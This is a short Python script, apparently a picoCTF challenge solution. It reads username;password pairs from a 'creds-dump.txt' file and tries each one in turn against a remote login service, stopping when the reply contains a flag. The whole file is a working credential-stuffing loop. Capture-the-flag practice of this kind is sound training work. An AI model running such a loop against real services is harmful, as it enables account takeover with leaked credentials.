import socket
import time

host = "chatelaine.cylabacademy.net"
port = 10097   

with open("creds-dump.txt", encoding="utf-8", errors="ignore") as f:
    for line in f:
        if ";" not in line:
            continue

        try:
            username, password = line.strip().split(";")
        except:
            continue

        print(f"Trying {username}:{password}")

        try:
            s = socket.socket()
            s.connect((host, port))

           
            s.recv(1024)

            
            s.send((username + "\n").encode())

           
            s.recv(1024)

            
            s.send((password + "\n").encode())

            
            response = s.recv(4096).decode(errors="ignore")

            
            if "picoCTF" in response:
                print("\n FLAG FOUND ")
                print(response)
                break

            s.close()

            
            time.sleep(0.5)

        except Exception as e:
            print("Connection error... retrying")
            time.sleep(1)
